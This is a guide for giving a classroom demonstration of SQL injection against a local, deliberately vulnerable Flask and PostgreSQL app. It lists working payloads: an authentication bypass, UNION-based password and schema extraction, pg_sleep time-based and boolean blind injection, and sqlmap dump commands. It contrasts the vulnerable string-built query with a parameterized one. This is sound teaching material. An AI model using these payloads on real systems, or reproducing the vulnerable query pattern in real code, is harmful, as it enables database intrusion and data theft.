# SQL Injection Demonstration Guide

This guide provides step-by-step instructions for demonstrating different SQL injection vulnerability testing techniques using this project.

## Prerequisites

1. PostgreSQL installed and running
2. Python 3.x with required packages installed (`pip install -r requirements.txt`)
3. Database setup completed (`python setup_db.py`)

## Setup Instructions

1. First, install the required Python packages:

```bash
pip install -r requirements.txt
```

2. Set up the demo database (only needs to be done once):

```bash
python setup_db.py
```

3. Start the Flask application:

```bash
python app.py
```

The Flask server will run on `http://localhost:5000`.

## Demonstration Techniques

### 1. Testing Normal Input

To demonstrate a baseline normal operation:

```bash
python test_sqli.py --test normal
```

**What to show:**
- Open browser to `http://localhost:5000` and enter "1" in the form
- Show that normal input returns expected user data
- Point out in the code that this is establishing a baseline before testing

### 2. Testing Error-based SQL Injection

To demonstrate error-based SQL injection:

```bash
python test_sqli.py --test error
```

**Manual demo steps:**
1. Open browser to `http://localhost:5000`
2. Enter `1'` in the form and submit
3. Show the SQL error message returned to the user
4. Explain how this reveals database structure information

**Key payloads to highlight:**
- `1'` (basic syntax error)
- `1 AND 1=2` (logical error - returns no data)
- `1' OR '1'='1` (authentication bypass)

**Code walkthrough:**
- Show the vulnerable code in `app.py` where string concatenation is used:
  ```python
  query = f"SELECT CAST(id AS VARCHAR), username, email FROM users WHERE id = {user_id}"
  ```

### 3. Testing Union-based SQL Injection

To demonstrate union-based SQL injection:

```bash
python test_sqli.py --test union
```

**Manual demo steps:**
1. Open browser to `http://localhost:5000`
2. Enter `0 UNION SELECT username, password, email FROM users` and submit
3. Show how sensitive data like passwords is revealed

**Key payloads to highlight:**
- `1 ORDER BY 1` (determine column count)
- `1 UNION SELECT 1,2,3` (basic union injection)
- `0 UNION SELECT username, password, email FROM users` (extracting sensitive data)

**For database schema extraction:**
```
0 UNION SELECT table_name, table_schema, 3 FROM information_schema.tables
```

### 4. Testing Time-based Blind SQL Injection

To demonstrate time-based blind SQL injection:

```bash
python test_sqli.py --test time
```

**Manual demo steps:**
1. Open browser to `http://localhost:5000`
2. Enter `1; SELECT pg_sleep(3)--` and submit
3. Show how the response is delayed by ~3 seconds

**Key demonstration points:**
- Use a stopwatch or timer to show the delay
- Explain how this technique can be used even when there's no visible output
- Show the terminal output highlighting the response time differences

### 5. Testing Boolean-based Blind SQL Injection

To demonstrate boolean-based blind SQL injection:

```bash
python test_sqli.py --test boolean
```

**Manual demo steps:**
1. Open browser to `http://localhost:5000`
2. Enter `1 AND 1=1` (returns data), then try `1 AND 1=2` (returns no data)
3. Show how responses differ based on the condition

**Key demonstration points:**
- Show how TRUE conditions return data while FALSE conditions don't
- Explain how attackers can use this to extract data bit by bit
- Demonstrate with practical examples like `1 AND (SELECT count(*) FROM users) > 0`

### 6. Comparing Secure vs. Vulnerable Endpoints

To demonstrate the difference between secure and vulnerable implementations:

```bash
python test_sqli.py --test compare
```

**Manual demo steps:**
1. Try same payloads on both endpoints:
   - Vulnerable: `http://localhost:5000/user?id=1 OR 1=1`
   - Secure: `http://localhost:5000/secure-user?id=1 OR 1=1`
2. Show how secure endpoint rejects malicious input

**Code comparison:**
- Show the vulnerable code:
  ```python
  query = f"SELECT CAST(id AS VARCHAR), username, email FROM users WHERE id = {user_id}"
  ```
- Show the secure code using parameterized queries:
  ```python
  query = "SELECT id, username, email FROM users WHERE id = %s"
  cur.execute(query, (user_id,))
  ```

### 7. Using Automated Tools (SQLMap)

If SQLMap is installed, demonstrate automated testing:

```bash
sqlmap -u "http://localhost:5000/user?id=1" --dbs
```

To extract tables from the database:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli --tables
```

To dump data from the users table:

```bash
sqlmap -u "http://localhost:5000/user?id=1" -D demo_sqli -T users --dump
```

## Common Demonstration Tips

1. **Audience Engagement**:
   - Ask questions like "What do you think will happen when we add a single quote?"
   - Have participants predict outcomes before showing results

2. **Visual Aids**:
   - Use browser's network tab to show response times for time-based attacks
   - Highlight important parts of error messages
   - Split screen to show code and results side by side

3. **Security Context**:
   - Always emphasize that these techniques are for educational purposes
   - Discuss prevention methods (parameterized queries, input validation, least privilege)
   - Show real-world impact by pointing out sensitive data exposure

## Troubleshooting

**Common issues:**

1. **Database connection failure**:
   - Check PostgreSQL is running
   - Verify connection parameters in app.py match your setup

2. **Flask app not starting**:
   - Check for port conflicts (default is 5000)
   - Ensure required packages are installed

3. **SQL injection not working**:
   - PostgreSQL syntax differs slightly from other databases
   - Check payload syntax for PostgreSQL compatibility
